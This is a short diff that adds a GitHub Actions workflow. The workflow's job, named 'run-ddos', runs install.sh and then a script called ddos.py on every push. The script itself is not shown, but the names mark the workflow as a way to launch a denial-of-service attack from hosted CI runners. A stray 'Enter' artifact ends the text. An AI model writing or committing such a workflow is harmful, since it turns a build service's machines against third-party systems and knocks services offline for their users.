@@ -1,0 +1,12 @@
+name: Install Dependencies and Run Script
+
+on: [push]
+
+jobs:
+  run-ddos:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - run: chmod +x install.sh
+      - run: ./install.sh
+      - run: python3 ddos.py￼Enter
